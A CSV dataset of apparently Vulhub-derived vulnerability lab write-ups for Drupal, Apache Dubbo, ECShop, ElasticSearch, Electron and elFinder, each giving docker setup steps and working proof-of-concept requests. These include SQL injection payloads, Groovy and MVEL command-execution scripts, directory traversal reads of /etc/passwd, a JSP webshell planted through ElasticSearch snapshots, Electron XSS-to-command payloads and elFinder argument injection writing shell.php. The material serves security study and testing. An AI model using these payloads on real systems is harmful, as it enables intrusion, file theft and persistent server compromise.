Software,CVE,Title,Info,References
drupal,CVE-2014-3704,"Drupal < 7.32 ""Drupalgeddon"" SQL Injection (CVE-2014-3704)","Drupal < 7.32 ""Drupalgeddon"" SQL Injection (CVE-2014-3704)

中文版本(Chinese version)

Drupal is a free and open-source web content management framework written in PHP and distributed under the GNU General Public License.

The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing crafted keys.

References:
<https://www.drupal.org/SA-CORE-2014-005
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704

Vulnerable Environment

Execute the following command to start a Drupal 7.31.


docker compose up -d


After the server is started, browse http://your-ip:8080 to see the Drupal installation wizard, and use the default configuration to install it.

Note that the Mysql database name is drupal, the database username and password is root, and the address is mysql:



After the installation is complete, browse the home page.



POC

The SQL injection does not require authentication and can execute malicious SQL statements by sending the following request.


POST /?q=node&destination=node HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

pass=lol&formbuildid=&formid=userlogin_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a


As can be seen, the SQL statement reports an error message with user data.
-------------------------------------------------------------------------------","https://www.drupal.org/SA-CORE-2014-005
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704"
drupal,CVE-2018-7602,Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602),"Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602)

中文版本(Chinese version)

Drupal is a free and open-source web content management framework written in PHP.

A remote code execution vulnerability exists in Drupal 7.x and 8.x. The vulnerability is caused by insufficient input sanitization, where double URL encoding of the '#' character can bypass the sanitize() function filter, leading to remote code execution.

References:
<https://www.drupal.org/sa-core-2018-004
<https://github.com/pimps/CVE-2018-7600
<https://github.com/kastellanos/CVE-2018-7602

Environment Setup

Execute the following command to start a vulnerable Drupal 7.57 server:

bash
docker compose up -d


After the server is started, visit http://your-ip:8080/ to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.

Remember the username and password of the account you created during the installation, because you will need it to exploit the vulnerability.

Vulnerability Reproduction

Using the PoC from pimps/CVE-2018-7600, execute the following command to exploit the vulnerability:

bash
Replace ""id"" with the command you want to execute
First ""drupal"" is your username, second ""drupal"" is your password
python3 drupa7-CVE-2018-7602.py -c ""id"" drupal drupal http://127.0.0.1:8080/


As shown in the red box in the image below, the command is successfully executed:
-------------------------------------------------------------------------------","https://www.drupal.org/sa-core-2018-004
https://github.com/pimps/CVE-2018-7600
https://github.com/kastellanos/CVE-2018-7602
http://127.0.0.1:8080/"
dubbo,CVE-2019-17564,Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564),"Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564)

中文版本(Chinese version)

Apache Dubbo is a high-performance, java based open source RPC framework.

Apache Dubbo supports different protocols, and its HTTP protocol handler is a wrapper of Spring Framework's org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.

A security warning of Spring Framework shows that an unsafe Java deserialization is exist in the HttpInvokerServiceExporter, which could lead to a RCE vulnerability:

WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code As a consequence, do not expose HTTP invoker endpoints to untrusted As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.

This vulnerability affects Apache Dubbo 2.7.4 and earlier, after 2.7.5 Dubbo replace HttpInvokerServiceExporter with com.googlecode.jsonrpc4j.JsonRpcServer.

Reference links.
https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html
https://www.anquanke.com/post/id/198747
https://paper.seebug.org/1128/

Vulnerable Application

Start an Apache Dubbo 2.7.3 Provider by executing the following command.


docker compose up -d


After the service is started, browser http://your-ip:8080 and the server will return an empty 500 error page by default.

Exploit

It is important to know the RPC interface name before leveraging this vulnerability.

Vulhub is exposing the port 8080 and port 2181, where 2181 is the port of Zookeeper. Download Zookeeper and use the script zkCli to connect to the unauthenticated Zookeeper server:


./zkCli -server target-ip:2181


After connecting, it is come with an interactive console, where you can ls all nodes, including Dubbo-related configuration.



Get the RPC interface named org.vulhub.api.CalcService. Use ysoserial to generate a CommonsCollections6 payload, then send it to http://your-ip:8080/org.vulhub.api.CalcService as POST body.


java -jar ysoserial.jar CommonsCollections6 ""touch /tmp/success"" 1.poc
curl -XPOST --data-binary @1.poc http://your-ip:8080/org.vulhub.api.CalcService




Entering the container, you can see that touch /tmp/success has been executed successfully.
-------------------------------------------------------------------------------","https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html
https://www.anquanke.com/post/id/198747
https://paper.seebug.org/1128/
http://your-ip:8080/org.vulhub.api.CalcService"
ecshop,Unknown,ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability,"ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability

中文版本(Chinese version)

ECShop is a B2C independent shop system for companies and individuals to quickly build personalized online store. This system is a cross-platform open source program based on PHP language and MYSQL database architecture.

In 2017 and previous versions, there was a SQL injection vulnerability that could inject payload and eventually lead to code execution vulnerabilities. The latest version of 3.6.0 has fixed the vulnerability, and vulhub uses its latest version 2.7.3 and 3.6.0 non-latest version versions to reproduce the vulnerability.

Reference link:
https://paper.seebug.org/691/

Environment setup

Run the following commands to start environment


docker compose up -d


After the environment start, visit http://your-ip:8080, you will see the 2.7.3 installation page. Visit http://your-ip:8081, you will see the 3.6.0 installation page.

Install both of them, mysql address is mysql, mysql account and password are root, the database name is free to fill in, but the database names of 2.7.3 and 3.6.0 can not be the same.

As the picture shows:



Exploit

There is a script that can generate POC for 2.x and 3.x:

php
<?php
$shell = bin2hex(""{\$asd'];phpinfo\t();//}xxx"");
$id = ""-1' UNION/*"";
$arr = [
    ""num"" =sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
    ""id"" =$id
];

$s = serialize($arr);

$hash3 = '45ea207d7a2b68c49582d2d22adf953a';
$hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';

echo ""POC for ECShop 2.x: \n"";
echo ""{$hash2}ads|{$s}{$hash2}"";
echo ""\n\nPOC for ECShop 3.x: \n"";
echo ""{$hash3}ads|{$s}{$hash3}"";


Put POC in the HTTP-Referer:


GET /user.php?act=login HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECSID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visittimes]=1
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:""num"";s:107:""/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -"";s:2:""id"";s:11:""-1' UNION/"";}45ea207d7a2b68c49582d2d22adf953a
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0




Result of 2.x:



Result of 3.x:
-------------------------------------------------------------------------------",https://paper.seebug.org/691/
ecshop,Unknown,ECShop 4.x collection_list SQL Injection,"ECShop 4.x collection_list SQL Injection

中文版本(Chinese version)

ECShop is a popular open-source e-commerce system. A SQL injection vulnerability exists in the collectionlist functionality of ECShop 4.x versions, which allows attackers to execute arbitrary SQL queries through the insert functions.

References:
<https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
<http://foreversong.cn/archives/1556

Environment Setup

Execute the following command to start ECShop 4.0.6:


docker compose up -d


After the server starts, visit http://your-ip:8080 to begin the installation process. During installation:
Set the database address to mysql
Set both username and password to root

Vulnerability Reproduction

The vulnerability is similar to xianzhi-2017-02-82239600, where arbitrary insert_ functions can be exploited for SQL injection.

Multiple insert functions can be used for exploitation. For example, using insertuser_account:

http
GET /user.php?act=collection_list HTTP/1.1
Host: your-ip:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auseraccount|a:2:{s:7:""userid"";s:38:""0'-(updatexml(1,repeat(user(),2),1))-'"";s:7:""payment"";s:1:""4"";}|45ea207d7a2b68c49582d2d22adf953a
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECSID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[userid]=3;ECS[username]=demo;ECS[visittimes]=2;ECSCPID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close





Note: You must be logged in as a normal user before attempting exploitation.

Alternatively, you can use insertpaylog as shown in this example:

http
GET /user.php?act=collection_list HTTP/1.1
Host: 192.168.1.162:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:44:""1' and updatexml(1,repeat(user(),2),1) and '"";|
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECSID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[userid]=3;ECS[username]=demo;ECS[visittimes]=2;ECSCPID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close
-------------------------------------------------------------------------------","https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
http://foreversong.cn/archives/1556"
elasticsearch,CVE-2014-3120,ElasticSearch Remote Code Execution (CVE-2014-3120),"ElasticSearch Remote Code Execution (CVE-2014-3120)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

The default configuration in Elasticsearch before 1.2 enables dynamic scripting, which allows remote attackers to execute arbitrary MVEL expressions and Java code via the source parameter to _search.

Here's an example of MVEL code that executes system commands:

java
import java.io.*;
new java.util.Scanner(Runtime.getRuntime().exec(""id"").getInputStream()).useDelimiter(""\\A"").next();


References:
<https://bou.ke/blog/elasticsearch-rce/
<https://www.exploit-db.com/exploits/33370

Vulnerability Reproduction

Execute the following commands to start a vulnerable ElasticSearch server 1.1.1:


docker compose up -d


After the server starts, you can access the ElasticSearch API at http://your-ip:9200.

Exploitation

The exploit requires at least one document in the index. First, create a document:


POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  ""name"": ""vulhub""
}


Then, send a request containing the malicious MVEL script to execute arbitrary commands:


POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    ""size"": 1,
    ""query"": {
      ""filtered"": {
        ""query"": {
          ""match_all"": {
          }
        }
      }
    },
    ""script_fields"": {
        ""command"": {
            ""script"": ""import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\""id\"").getInputStream()).useDelimiter(\""\\\\A\"").next();""
        }
    }
}


The command execution result will be returned in the response:
-------------------------------------------------------------------------------","https://bou.ke/blog/elasticsearch-rce/
https://www.exploit-db.com/exploits/33370"
elasticsearch,CVE-2015-3337,ElasticSearch Plug-in Directory Traversal (CVE-2015-3337),"ElasticSearch Plug-in Directory Traversal (CVE-2015-3337)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

In the ElasticSearch versions before 1.4.5 and 1.5.x before 1.5.2, a directory traversal vulnerability exists in ElasticSearch's plugin functionality that allows attackers to read arbitrary files on the system.

References:
<https://nvd.nist.gov/vuln/detail/CVE-2015-3337
<https://github.com/elastic/elasticsearch/issues/10828

Vulnerability Description

After installing a plugin with ""site"" functionality, an attacker can use ../ in the plugin directory path to traverse up the directory tree, leading to arbitrary file read. ElasticSearch installations without any plugins are not affected.

Environment Setup

Execute the following commands to build and start an ElasticSearch server 1.4.4:


docker compose build
docker compose up -d


The test environment comes with a pre-installed plugin: elasticsearch-head, which is a web front-end for ElasticSearch. More information about this plugin can be found at: <https://github.com/mobz/elasticsearch-head

Vulnerability Reproduction

To exploit this vulnerability, send a request to read arbitrary files using directory traversal in the plugin path. For example, to read /etc/passwd, send a request to:


http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd


Note: Do not access this URL directly in a browser.



Additional Information

The head plugin provides a web interface for ElasticSearch. You can access it at http://your-ip:9200/_plugin/head/ to interact with your ElasticSearch cluster through a graphical interface.
-------------------------------------------------------------------------------","https://nvd.nist.gov/vuln/detail/CVE-2015-3337
https://github.com/elastic/elasticsearch/issues/10828
https://github.com/mobz/elasticsearch-head"
elasticsearch,CVE-2015-5531,ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531),"ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

In the ElasticSearch versions before 1.6.1, a directory traversal vulnerability exists in ElasticSearch's snapshot and restore functionality, allowing attackers to read arbitrary files on the system.

The conditions for exploiting this vulnerability vary depending on the specific version of the target: in ElasticSearch 1.5.1 and earlier versions, this vulnerability could be triggered without any configuration; in later versions, the path.repo configuration must be set in elasticsearch.yml. This configuration specifies a directory that must be writable and serves as the root location for backup repositories. Without this configuration, the snapshot and restore functionality is disabled by default.

References:
<https://www.exploit-db.com/exploits/38383/
<http://www.freebuf.com/vuls/99942.html

Environment Setup

Execute the following commands to build and start an ElasticSearch server 1.6.0:


docker compose build
docker compose up -d


After the environment starts, you can access the ElasticSearch server at http://your-ip:9200.

Vulnerability Reproduction

1. Create a Repository


PUT /_snapshot/test HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    ""type"": ""fs"",
    ""settings"": {
        ""location"": ""/usr/share/elasticsearch/repo/test"" 
    }
}




2. Create a Snapshot


PUT /_snapshot/test2 HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    ""type"": ""fs"",
    ""settings"": {
        ""location"": ""/usr/share/elasticsearch/repo/test/snapshot-backdata"" 
    }
}




3. Exploit Directory Traversal to Read Files

Send a request to read arbitrary files using directory traversal. For example, to read /etc/passwd:


http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd




The file content will be included in the error message (encoded). After decoding, you can obtain the file content:
-------------------------------------------------------------------------------","https://www.exploit-db.com/exploits/38383/
http://www.freebuf.com/vuls/99942.html"
elasticsearch,CVE-2015-1427,ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427),"ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

ElasticSearch versions prior to 1.3.8 and 1.4.3 contain a vulnerability in the Groovy scripting engine that allows attackers to bypass the sandbox protection and execute arbitrary code on the server.

After CVE-2014-3120, ElasticSearch changed its default dynamic scripting language to Groovy and added a sandbox. However, dynamic language execution remained enabled by default. This vulnerability involves:

1. A sandbox bypass
2. A Groovy code execution vulnerability

ElasticSearch supports using ""sandboxed"" Groovy language as a dynamic scripting engine. However, the sandbox implementation was insufficient. Two methods for command execution were discovered:

1. Lupin's method: Bypass the Java sandbox using reflection
2. Tang3's method: Use Groovy language features to execute commands directly, without using Java

Based on these approaches, we have two different POCs.

Java sandbox bypass method:

groovy
java.lang.Math.class.forName(""java.lang.Runtime"").getRuntime().exec(""id"").getText()


Groovy direct command execution method:

groovy
def command='id';def res=command.execute().text;res


References:
<http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
<https://github.com/XiphosResearch/exploits
<http://cb.drops.wiki/drops/papers-5107.html
<http://cb.drops.wiki/drops/papers-5142.html

Environment Setup

Execute the following commands to start a 1.4.2 version ElasticSearch server:


docker compose up -d


After the server starts, you can access the ElasticSearch server at http://your-ip:9200.

Vulnerability Reproduction

Since querying requires at least one document in the index, first send the following request to add data:


POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  ""name"": ""test""
}


Then send a request containing the payload to execute arbitrary commands:


POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{""size"":1, ""script_fields"": {""lupin"":{""lang"":""groovy"",""script"": ""java.lang.Math.class.forName(\""java.lang.Runtime\"").getRuntime().exec(\""id\"").getText()""}}}


The command execution result will be returned in the response:
-------------------------------------------------------------------------------","http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
https://github.com/XiphosResearch/exploits
http://cb.drops.wiki/drops/papers-5107.html
http://cb.drops.wiki/drops/papers-5142.html"
elasticsearch,Unknown,ElasticSearch Arbitrary File Upload (WooYun-2015-110216),"ElasticSearch Arbitrary File Upload (WooYun-2015-110216)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

A vulnerability in ElasticSearch's backup functionality allows attackers to write arbitrary files to the filesystem, potentially leading to webshell upload when combined with other web services.

ElasticSearch includes a data backup feature that allows users to specify a path where backup data will be stored. Both the path and file names are controllable by the user.

If other web services (like Tomcat, PHP, etc.) are running on the same system, an attacker can exploit ElasticSearch's backup functionality to write a webshell to a web-accessible directory.

Similar to CVE-2015-5531, this vulnerability is related to the backup repository functionality. In ElasticSearch versions after 1.5.1, the root path of backup repositories is restricted to the path.repo configuration option. If administrators don't configure this option, the backup functionality is disabled by default. Even if configured, writing a webshell is only possible if the web root is within the configured directory.

References:
<http://cb.drops.wiki/bugs/wooyun-2015-0110216.html

Environment Setup

Execute the following commands to start a ElasticSearch server 1.5.1, and a Tomcat server is running on the same container:


docker compose up -d


After the environment starts, you can access the ElasticSearch server at http://your-ip:9200, and the Tomcat server at http://your-ip:8080.

Tomcat is installed in /usr/local/tomcat with its web directory at /usr/local/tomcat/webapps. ElasticSearch is installed in /usr/share/elasticsearch.

Vulnerability Reproduction

Our goal is to use ElasticSearch to write a webshell into /usr/local/tomcat/webapps.

First, create a malicious index document:


curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'
{""<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%"":""test""}
'


Then create a malicious repository. The location value is the path where we want to write our file.

Note: The Repositories path is interesting because it can write to any accessible location, and if the path doesn't exist, it will be created automatically. This means you can create arbitrary directories using the file access protocol. Here we point the path to Tomcat's web deployment directory because Tomcat will automatically create a new application when a folder is created in this directory (if the filename is wwwroot, the created application name will be wwwroot).


curl -XPUT 'http://127.0.0.1:9200/_snapshot/yz.jsp' -d '{
     ""type"": ""fs"",
     ""settings"": {
          ""location"": ""/usr/local/tomcat/webapps/wwwroot/"",
          ""compress"": false
     }
}'


Verify and create the repository:


curl -XPUT ""http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp"" -d '{
     ""indices"": ""yz.jsp"",
     ""ignore_unavailable"": ""true"",
     ""includeglobalstate"": false
}'


Done!

Access http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp to find our uploaded webshell.

This shell allows writing arbitrary strings to test.jsp in the wwwroot directory. For example: http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success. Then accessing /wwwroot/test.jsp will show ""success"":
-------------------------------------------------------------------------------","http://cb.drops.wiki/bugs/wooyun-2015-0110216.html
http://127.0.0.1:9200/yz.jsp/yz.jsp/1"
electron,CVE-2018-15685,Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）,"Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）

中文版本(Chinese version)

Electron is an open source library developed by GitHub for building cross-platform desktop applications with HTML, CSS, and JavaScript. Electron accomplishes this by combining Chromium and Node.js into a single runtime and apps can be packaged for Mac, Windows, and Linux.

When Electron sets nodeIntegration=false (default), the JavaScript in the page cannot access the built-in library of node.js. CVE-2018-15685 bypass this limitation, enabling arbitrary commands to be executed if the user can execute JavaScript (such as when accessing a third-party page or an XSS vulnerability exists in the app).

Reference links:
https://electronjs.org/blog/web-preferences-fix
https://www.contrastsecurity.com/security-influencers/cve-2018-15685

Compile application

Execute the following command to compile an  vulnerability application:


docker compose run -e PLATFORM=win64 --rm electron


The value of PLATFORM is the operating system on which the application is running. The options are:win64、win32、mac、linux。

After the compilation completed, execute the following command to run the web service:


docker compose run --rm -p 8080:80 web


Now，accesshttp://your-ip:8080/cve-2018-15685.tar.gzto download application.

expliot

Open the app:



Click submit, the content in the input box will be displayed in the app, and there is obviously an XSS vulnerability.

We submit <img src=1 onerror=""require('child_process').exec('calc.exe')""and find that nothing happens, because nodeIntegration=false.

At this time, submit the POC (Windows):


<img src=1 onerror=""window.open().open('data:text/html,<scriptrequire(\'child_process\').exec(\'calc.exe\')</script');""


As you see, calc.exe shows up.
-------------------------------------------------------------------------------","https://electronjs.org/blog/web-preferences-fix
https://www.contrastsecurity.com/security-influencers/cve-2018-15685"
electron,CVE-2018-1000006,Electron Remote Code Execution Vulnerability（CVE-2018-1000006）,"Electron Remote Code Execution Vulnerability（CVE-2018-1000006）

中文版本(Chinese version)

Electron is an open source library developed by GitHub for building cross-platform desktop applications with HTML, CSS, and JavaScript. Electron accomplishes this by combining Chromium and Node.js into a single runtime and apps can be packaged for Mac, Windows, and Linux.

On Windows, if an application developed by Electron registers a Protocol Handler (allowing the user to call the application in the browser), a parameter injection vulnerability may occur and eventually cause remote code vulnerability on the user side.

Reference link:Electron < v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】

Setup

Execute the following commands to compile an vulnerability application:


docker compose run -e ARCH=64 --rm electron


Because the software needs to run on the Windows platform, it is necessary to set the value of the ARCH to the number of bits of the platform: 32 or 64.

After the compilation completed, execute the following command to run the web service:


docker compose run --rm -p 8080:80 web


Now, accesshttp://your-ip:8080/You can see the POC page.

Exploit

First, on the POC page, click on the first link and download the compiled software vulhub-app.tar.gz. After the download is complete, extract it and run it once:



This time the Protocol Handler will be registered.

Then, go back to the POC page and click on the second link. The target software and calculator will pop up:



If fails, it may be browser's reason. After testing, the new Chrome browser will call vulhub-app when it clicks on the POC, but it will not execute calc.exe.
-------------------------------------------------------------------------------",
elfinder,CVE-2021-32682,elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682),"elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682)

中文版本(Chinese version)

elFinder is an open-source file manager for web, written in JavaScript using jQuery UI.

There is a arguments injection vulnerability found in the elFinder 2.1.48 and before. This vulnerability can allow an attacker to execute arbitrary commands on the server hosting the elFinder PHP connector, even with minimal configuration. The issues were patched in version 2.1.59. As a workaround, ensure the connector is not exposed without authentication.

References:
<https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
<https://packetstormsecurity.com/files/164173/elfinderarchivecmd_injection.rb.txt
<https://xz.aliyun.com/t/10739

Vulnerability Environment

Execute following command to start a elFinder 2.1.48:


docker compose up -d


After the server is started, you can see the main page of elFinder at http://your-ip:8080.

Vulnerability Reproduce

Firstly, you should prepare 2 files for this vulnerability flow.

Create a plain text file named 1.txt:



Archive this file in the right-click menu to ZIP format, and modify this archived file name to 2.zip:



1.txt and 2.zip are ready here:



Then, send the following request to execute arbitrary commands:


GET /php/connector.minimal.php?cmd=archive&name=-TvTT=idshell.php%20%23%20a.zip&target=l1Lw&targets%5B1%5D=l1Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, /; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://localhost.lan:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close




In this request, you can see 3 important parameters:
name, its value is equal to -TvTT=idshell.php # a.zip, you can modify the idshell.php to arbitrary commands
targets[0], its value is equal to l1_MS50eHQ. l1 means the first storage volume, MS50eHQ is the base64 encoded string of 1.txt
targets[1], its value is equal to l1_Mi56aXA. l1 means the first storage volume, Mi56aXA is the base64 encoded string of 2.zip

Although this request responeds to an error message, our command has been executed and shell.php has been written to http://your-ip:8080/files/shell.php:
-------------------------------------------------------------------------------","https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
https://xz.aliyun.com/t/10739
http://localhost.lan:8080/"
